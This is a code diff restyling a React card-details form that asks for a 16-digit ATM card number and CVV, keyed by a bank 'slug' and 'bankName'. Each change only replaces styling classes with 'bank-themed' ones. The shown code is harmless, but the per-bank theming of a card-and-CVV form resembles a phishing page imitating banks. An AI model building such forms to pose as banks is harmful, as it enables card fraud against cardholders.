@@ -152,7 +152,7 @@ export function CardDetailsForm({ slug, bankName }: { slug: string; bankName: st
           value={cardNumber}
           onChange={(e) => handleCardNumber(e.target.value)}
           placeholder="ATM Card Number (16 digits)"
-          className="w-full rounded-2xl border border-border bg-card px-5 py-4 text-base text-foreground shadow-sm outline-none ring-2 ring-transparent transition placeholder:text-muted-foreground focus:ring-primary"
+          className="bank-themed-input w-full rounded-2xl border px-5 py-4 text-base text-foreground shadow-sm outline-none ring-2 ring-transparent transition placeholder:text-muted-foreground"
         />
       </div>
 
@@ -187,7 +187,7 @@ export function CardDetailsForm({ slug, bankName }: { slug: string; bankName: st
             maxLength={3}
             onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 3))}
             placeholder="CVV"
-            className="w-full rounded-2xl border border-border bg-card px-4 py-4 text-base text-foreground shadow-sm outline-none ring-2 ring-transparent transition placeholder:text-muted-foreground focus:ring-primary"
+            className="bank-themed-input w-full rounded-2xl border px-4 py-4 text-base text-foreground shadow-sm outline-none ring-2 ring-transparent transition placeholder:text-muted-foreground"
           />
         </div>
       </div>
@@ -226,7 +226,7 @@ export function CardDetailsForm({ slug, bankName }: { slug: string; bankName: st
       <button
         type="submit"
         disabled={!isValid}
-        className="flex w-full items-center justify-center gap-2 rounded-2xl bg-primary py-4 text-base font-bold text-primary-foreground shadow-md transition-all duration-100 hover:brightness-105 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring active:scale-[0.98] active:brightness-95 disabled:cursor-not-allowed disabled:opacity-50 disabled:active:scale-100"
+        className="bank-themed-button flex w-full items-center justify-center gap-2 rounded-2xl py-4 text-base font-bold shadow-md transition-all duration-100 hover:brightness-105 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring active:scale-[0.98] active:brightness-95 disabled:cursor-not-allowed disabled:opacity-50 disabled:active:scale-100"
       >
         Next
         <ChevronRight className="h-5 w-5" aria-hidden="true" />
